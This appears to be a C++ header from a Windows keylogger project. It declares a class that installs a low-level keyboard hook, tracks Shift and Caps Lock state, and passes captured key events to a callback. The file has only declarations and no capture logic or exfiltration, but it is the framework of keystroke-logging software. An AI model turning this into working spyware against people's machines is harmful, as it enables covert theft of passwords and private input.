#pragma once

#include <Windows.h>
#include <functional>

#include "Clipboard.hpp"

/*
	Can't be inside the Keylogger class because of HOOKPROC definition
*/
LRESULT CALLBACK ProcKeyboard(int nCode, WPARAM wParam, LPARAM lParam);

class Keylogger: public Clipboard {
public:
	Keylogger();
	Keylogger(std::function<void(PKBDLLHOOKSTRUCT)>& callback);
	~Keylogger();

	inline bool IsCapslockToggle() {
		return GetKeyState(VK_CAPITAL) & 1;
	}

	inline bool IsShiftDown() {
		return GetAsyncKeyState(VK_LSHIFT) < 0 || GetAsyncKeyState(VK_RSHIFT) < 0;
	}

	inline bool Update() {
		if(!GetMessageA(&msg, nullptr, 0, 0)) {
			this->~Keylogger();
			return false;
		}

		return true;
	}

	void SetCallback(std::function<void(PKBDLLHOOKSTRUCT)>& callback);

	static std::vector<std::string> vkCodesAll;

private:
	static HHOOK hookKeyboard;
	static MSG msg;
	static std::function<void(PKBDLLHOOKSTRUCT)> callback;
};